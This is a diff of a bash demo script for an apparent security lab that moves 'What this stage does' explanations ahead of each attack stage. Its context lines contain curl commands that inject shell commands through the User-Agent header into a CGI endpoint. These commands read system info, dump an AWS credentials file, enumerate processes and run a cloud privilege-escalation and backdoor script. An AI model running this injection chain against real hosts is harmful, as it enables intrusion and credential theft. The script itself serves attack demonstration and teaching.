@@ -1205,6 +1205,11 @@ runtime_exploits() {
   # System reconnaissance
   echo "${CYAN}[1/5] System Reconnaissance (T1083 - File and Directory Discovery)${RESET}"
   echo ""
+  echo "📋 ${BOLD}What this stage does:${RESET}"
+  echo "• Gathers basic system information to understand the compromised environment"
+  echo "• Identifies OS version, kernel, and system architecture"
+  echo "• Typical first step after gaining remote code execution"
+  echo ""
   local cmd1="curl -s -H 'User-Agent: echo === SYSTEM INFO ===; /bin/cat /etc/issue | head -n 1 | tr -d \"\\\\\" | sed \"s/\\\\l//g\" | sed \"s/\\\\n//g\" | xargs; echo === KERNEL INFO ===; /bin/uname -a' http://${ip}/cgi-bin/exec.cgi"
   echo "💻 ${BOLD}Command being executed:${RESET}"
   echo "${DIM}${cmd1}${RESET}"
@@ -1228,17 +1233,18 @@ runtime_exploits() {
   done
   echo -e "${DIM}--- Live Output End ---${RESET}"
   echo ""
-  echo "📋 ${BOLD}What this stage does:${RESET}"
-  echo "• Gathers basic system information to understand the compromised environment"
-  echo "• Identifies OS version, kernel, and system architecture"
-  echo "• Typical first step after gaining remote code execution"
-  echo ""
   echo "${GREEN}✅ System reconnaissance complete${RESET}"
   echo ""
   pause
   
   # Credential harvesting with secret discovery
   echo "${CYAN}[2/5] Credential Harvesting (T1552.001 - Credentials In Files)${RESET}"
+  echo ""
+  echo "📋 ${BOLD}What this stage does:${RESET}"
+  echo "• Enumerates filesystem to locate sensitive directories"
+  echo "• Searches for hardcoded credentials and secrets"
+  echo "• Accesses AWS credentials that could enable cloud privilege escalation"
+  echo "• Demonstrates poor secrets management practices"
   echo ""
   local cmd2="curl -s -H \"User-Agent: echo '=== DIRECTORY LISTING ==='; ls -la /opt/cnappuccino/secret/; echo '=== AWS CREDENTIALS ==='; cat /opt/cnappuccino/secret/aws_creds.txt\" http://${ip}/cgi-bin/exec.cgi"
   echo "💻 ${BOLD}Command being executed:${RESET}"
@@ -1269,18 +1275,17 @@ runtime_exploits() {
   done
   echo -e "${DIM}--- Live Output End ---${RESET}"
   echo ""
-  echo "📋 ${BOLD}What this stage does:${RESET}"
-  echo "• Enumerates filesystem to locate sensitive directories"
-  echo "• Searches for hardcoded credentials and secrets"
-  echo "• Accesses AWS credentials that could enable cloud privilege escalation"
-  echo "• Demonstrates poor secrets management practices"
-  echo ""
   echo "${GREEN}✅ Credential harvesting complete${RESET}"
   echo ""
   pause
   
   # File system enumeration
   echo "${CYAN}[3/5] File System Enumeration (T1083 - File and Directory Discovery)${RESET}"
+  echo ""
+  echo "📋 ${BOLD}What this stage does:${RESET}"
+  echo "• Explores the file system to discover additional sensitive data"
+  echo "• Maps out directory structure and file permissions"
+  echo "• Looks for configuration files, logs, and other valuable information"
   echo ""
   local cmd3="curl -s -H \"User-Agent: echo '=== FILE ENUMERATION ==='; /bin/ls -la /opt/cnappuccino/\" http://${ip}/cgi-bin/exec.cgi"
   echo "💻 ${BOLD}Command being executed:${RESET}"
@@ -1307,17 +1312,17 @@ runtime_exploits() {
   done
   echo -e "${DIM}--- Live Output End ---${RESET}"
   echo ""
-  echo "📋 ${BOLD}What this stage does:${RESET}"
-  echo "• Explores the file system to discover additional sensitive data"
-  echo "• Maps out directory structure and file permissions"
-  echo "• Looks for configuration files, logs, and other valuable information"
-  echo ""
   echo "${GREEN}✅ File system enumeration complete${RESET}"
   echo ""
   pause
   
   # Process enumeration
   echo "${CYAN}[4/5] Process Enumeration (T1057 - Process Discovery)${RESET}"
+  echo ""
+  echo "📋 ${BOLD}What this stage does:${RESET}"
+  echo "• Identifies running processes and services"
+  echo "• Maps potential attack vectors and privilege escalation opportunities"
+  echo "• Gathers information about system usage and monitoring tools"
   echo ""
   local cmd4="curl -s -H \"User-Agent: echo '=== PROCESS ENUMERATION ==='; /bin/ps aux | head -10\" http://${ip}/cgi-bin/exec.cgi"
   echo "💻 ${BOLD}Command being executed:${RESET}"
@@ -1340,11 +1345,6 @@ runtime_exploits() {
   done
   echo -e "${DIM}--- Live Output End ---${RESET}"
   echo ""
-  echo "📋 ${BOLD}What this stage does:${RESET}"
-  echo "• Identifies running processes and services"
-  echo "• Maps potential attack vectors and privilege escalation opportunities"
-  echo "• Gathers information about system usage and monitoring tools"
-  echo ""
   echo "${GREEN}✅ Process enumeration complete${RESET}"
   echo ""
   pause
@@ -1363,6 +1363,13 @@ runtime_exploits() {
       echo "${DIM}Dry-run only. No real cloud resources will be modified.${RESET}"
       sleep 0.7
   fi
+  echo ""
+  echo "📋 ${BOLD}What this stage does (CIEM Attack Narrative):${RESET}"
+  echo "• Uses EC2 instance IAM role to assume more privileged Lambda admin role"
+  echo "• Creates AWS Lambda function with elevated permissions"
+  echo "• Demonstrates cloud privilege escalation and identity chaining"
+  echo "• Shows how compute instances can access broader cloud resources"
+  echo ""
   local cmd5="curl -s -H \"User-Agent: echo '=== CIEM ${ciem_mode^^} ==='; /bin/bash /opt/cnappuccino/exploits/ciem_test.sh ${ciem_mode}\" http://${ip}/cgi-bin/exec.cgi"
   echo "💻 ${BOLD}Command being executed:${RESET}"
   echo "${DIM}${cmd5}${RESET}"
@@ -1401,30 +1408,6 @@ runtime_exploits() {
       echo ""
     fi
   fi
-  echo "📋 ${BOLD}What this stage does (CIEM Attack Narrative):${RESET}"
-  echo ""
-  echo "${BOLD}Attack Discovery Phase:${RESET}"
-  echo "• Attacker discovers AWS IAM role attached to compromised EC2 instance"
-  echo "• Uses Instance Metadata Service (IMDS) to enumerate available credentials"
-  echo "• Identifies EC2 instance role: ${DIM}cnappuccino_lab_instance_role${RESET}"
-  echo ""
-  echo "${BOLD}Privilege Escalation Discovery:${RESET}"
-  echo "• Attacker discovers a second IAM role with elevated privileges:"
-  echo "  ${CYAN}Target Role ARN: arn:aws:iam::ACCOUNT:role/LambdaAdminRole${RESET}"
-  echo "• Tests if EC2 instance role can assume the Lambda admin role (AssumeRole)"
-  echo "• Exploits overly permissive trust relationships or role chaining"
-  echo ""
-  echo "${BOLD}Backdoor Creation:${RESET}"
-  if [[ "${ciem_mode}" == "--execute" ]]; then
-    echo "• ${RED}PERFORMS REAL AWS ACTIONS:${RESET} AssumeRole → Create Lambda function"
-    echo "• Creates persistent backdoor: ${BOLD}cnappuccino-backdoor-test${RESET}"
-  else
-    echo "• ${YELLOW}SIMULATES:${RESET} AssumeRole → Create Lambda function"
-    echo "• Would create persistent backdoor: ${BOLD}cnappuccino-backdoor-test${RESET}"
-  fi
-  echo "• Lambda function provides persistent access independent of original compromise"
-  echo "• Demonstrates cloud privilege escalation (EC2 → Lambda Admin)"
-  echo ""
   echo "${GREEN}✅ CIEM privilege escalation simulation complete${RESET}"
   echo ""
   
